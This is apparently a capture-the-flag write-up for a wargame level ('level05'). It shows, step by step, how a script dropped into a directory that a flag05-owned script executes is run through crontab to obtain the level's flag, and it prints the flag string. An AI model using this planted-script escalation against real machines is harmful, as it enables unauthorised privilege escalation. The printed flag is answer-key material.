# level05

We got some intel from level00:
-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver

/opt/openarenaserver

/usr/sbin/openarenaserver

/rofs/opt/openarenaserver

/rofs/usr/sbin/openarenaserver

```shell
cat /usr/sbin/openarenaserver
```

shows a bash script that runs all scripts in `/opt/openarenaserver`

```shell
ls -la /usr/sbin/openarenaserver
```

shows that this script belongs to flag05, thus executing it with crontab would maybe esacalte privileges

```shell
echo -e "getflag > /opt/openarenaserver/flag" > /opt/openarenaserver/exploit.sh
```

```shell
crontab -e
```

```shell
* * * * * /opt/openarenaserver/exploit.sh
```

to execute exploit every minute

wait for < 1 minute for crontab to execute

```shell
cat /opt/openarenaserver/flag
```

gives flag:

```shell
viuaaale9huek52boumoomioc
```
